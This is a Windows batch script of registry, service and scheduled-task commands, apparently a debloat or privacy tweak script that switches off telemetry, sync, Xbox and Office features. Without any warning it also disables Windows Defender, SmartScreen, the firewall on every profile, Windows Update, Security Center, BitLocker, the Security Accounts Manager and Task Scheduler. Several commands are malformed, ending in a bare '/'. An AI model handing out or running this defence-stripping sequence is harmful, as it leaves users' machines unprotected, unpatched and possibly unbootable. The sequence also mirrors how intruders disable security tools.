reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d 0 /f 
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CanCortanaBeEnabled" /t REG_DWORD /d 0 /f 
reg add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "DeviceHistoryEnabled" /t REG_DWORD /d 0 /f 
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "HistoryViewEnabled" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f 
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\iphlpsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ClipSVC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\AppXSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\LicenseManager" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NgcSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NgcCtnrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wlidsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TokenBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WalletService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v "AutoDownload" /t REG_DWORD /d "2" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v "DisableStoreApps" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v "RemoveWindowsStore" /t REG_DWORD /d "1" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization" /v "SystemSettingsDownloadMode" /t REG_DWORD /d 0 /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d 0 /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "SystemSettingsDownloadMode" /t REG_DWORD /d 0 /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DoSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\defragsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vds" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_SZ /d "00000000" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Windows.Gaming.GameBar.PresenceServer.Internal.PresenceWriter" /v "ActivationType" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\XboxNetApiSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\XblGameSave" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\XblAuthManager" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\xbgm" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\XboxGipSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SmsRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\AJRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\BDESVC" /v "Start" /t REG_DWORD /d "4" /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync" /v "SyncPolicy" /t Reg_DWORD /d 5 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\AppSync" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\DesktopTheme" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\PackageState" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\StartLayout" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t Reg_DWORD /d 0 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSync" /t Reg_DWORD /d 2 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableAppSyncSettingSync" /t Reg_DWORD /d 2 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableAppSyncSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableApplicationSettingSync" /t Reg_DWORD /d 2 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableApplicationSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableCredentialsSettingSync" /t Reg_DWORD /d 2 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableCredentialsSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableDesktopThemeSettingSync" /t Reg_DWORD /d 2 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableDesktopThemeSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisablePersonalizationSettingSync" /t Reg_DWORD /d 2 /f 
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisablePersonalizationSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableStartLayoutSettingSync" /t Reg_DWORD /d 2 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableStartLayoutSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableSyncOnPaidNetwork" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableWebBrowserSettingSync" /t Reg_DWORD /d 2 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableWebBrowserSettingSyncUserOverride" /t Reg_DWORD /d 1 /f
Reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\SettingSync" /v "DisableWindowsSettingSync" /t Reg_DWORD /d 2 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\BTAGService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bthserv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\BthAvctpSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NaturalAuthentication" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\BluetoothUserService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Messenger\Client" /v "CEIP" /t REG_DWORD /d "2" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient" /v "CorporateSQMURL" /t REG_SZ /d "0.0.0.0" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wuauserv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WaaSMedicSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PeerDistSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\UsoSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\DoSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Biometrics" /v "Enabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WbioSrvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SamSs" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wscsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
net stop Sense
net stop WdFilter
net stop WdNisSvc
net stop WinDefend
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v "OneTimeSqmDataSent" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpyNetReporting" /t REG_DWORD /d 0 /
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\UX Configuration" /v "DisablePrivacyMode" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Scan" /v "AutomaticallyCleanAfterScan" /t REG_DWORD /d "0" /f
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable > NUL 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d 4 /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d 4 /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d 4 /f
regsvr32 /s /u "%ProgramFiles%\Windows Defender\shellext.dll"
taskkill /f /im MSASCuiL.exe
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableAntiSpywareRealtimeProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DpaDisabled" /t REG_DWORD /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v "ProductStatus" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v "ManagedDefenderProductType" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\mpssvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\BFE" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "DisableNotifications" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "DoNotAllowExceptions" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v "EnableFirewall" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v "DisableNotifications" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v "DoNotAllowExceptions" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "DisableNotifications" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "DoNotAllowExceptions" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\HvHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmickvpexchange" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmicguestinterface" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmicshutdown" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmicheartbeat" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmicvmsession" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmicrdv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmictimesync" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmicvss" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WpnService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WpnUserService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Fax" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PrintNotify" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PrintWorkflowUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SCardSvr" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ScDeviceEnum" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SCPolicySvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\CertPropSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisablePCA" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Schedule" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TimeBrokerSvc" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncSvc_402ac" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSync" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableMeteredNetworkFileSync" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\OneDrive" /v "DisableLibrariesDefaultSaveToOneDrive" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\OneDrive" /v "DisablePersonalSync" /t REG_DWORD /d 1 /f
reg add "HKCR\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /v System.IsPinnedToNameSpaceTree /d "0" /t REG_DWORD /f
reg add "HKCR\Wow6432Node\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /v System.IsPinnedToNameSpaceTree /d "0" /t REG_DWORD /f
cls
reg add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
reg add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
reg add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype\ETW" /v "TraceLevelThreshold" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype" /v "EnableTracing" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype\ETW" /v "EnableTracing" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype" /v "WPPFilePath" /t REG_SZ /d "%%SYSTEMDRIVE%%\TEMP\Tracing\WPPMedia" /f
reg add "HKCU\SOFTWARE\Microsoft\Tracing\WPPMediaPerApp\Skype\ETW" /v "WPPFilePath" /t REG_SZ /d "%%SYSTEMDRIVE%%\TEMP\WPPMedia" /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\15.0\osm" /v "enablefileobfuscation" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\15.0\osm" /v "enablelogging" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\15.0\osm" /v "enableupload" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common" /v "qmenable" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common" /v "sendcustomerdata" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common" /v "updatereliabilitydata" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common\feedback" /v "enabled" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common\feedback" /v "includescreenshot" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common\internet" /v "useonlinecontent" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common\ptwatson" /v "ptwoptin" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm" /v "enablefileobfuscation" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm" /v "enablelogging" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm" /v "enableupload" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "accesssolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "olksolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "onenotesolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "pptsolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "projectsolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "publishersolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "visiosolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "wdsolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedapplications" /v "xlsolution" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "agave" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "appaddins" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "comaddins" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "documentfiles" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\osm\preventedsolutiontypes" /v "templatefiles" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\excel\security" /v "blockcontentexecutionfrominternet" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\outlook\security" /v "level" /t REG_DWORD /d 2 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\powerpoint\security" /v "blockcontentexecutionfrominternet" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\word\security" /v "blockcontentexecutionfrominternet" /t REG_DWORD /d 0 /f
sc stop "AdobeARMservice" & sc config "AdobeARMservice" start=disabled
sc stop "adobeupdateservice" & sc config "adobeupdateservice" start=disabled
sc stop "adobeflashplayerupdatesvc" & sc config "adobeflashplayerupdatesvc" start=disabled
schtasks /change /tn "Adobe Acrobat Update Task" /disable
schtasks /change /tn "Adobe Flash Player Updater" /disable
sc stop "Razer Game Scanner Service" & sc config "Razer Game Scanner Service" start=disabled
sc stop "LogiRegistryService" & sc config "LogiRegistryService" start=disabled
reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "DisableVidMemVBs" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Direct3D" /v "MMX Fast Path" /t REG_DWORD /d "1" /f
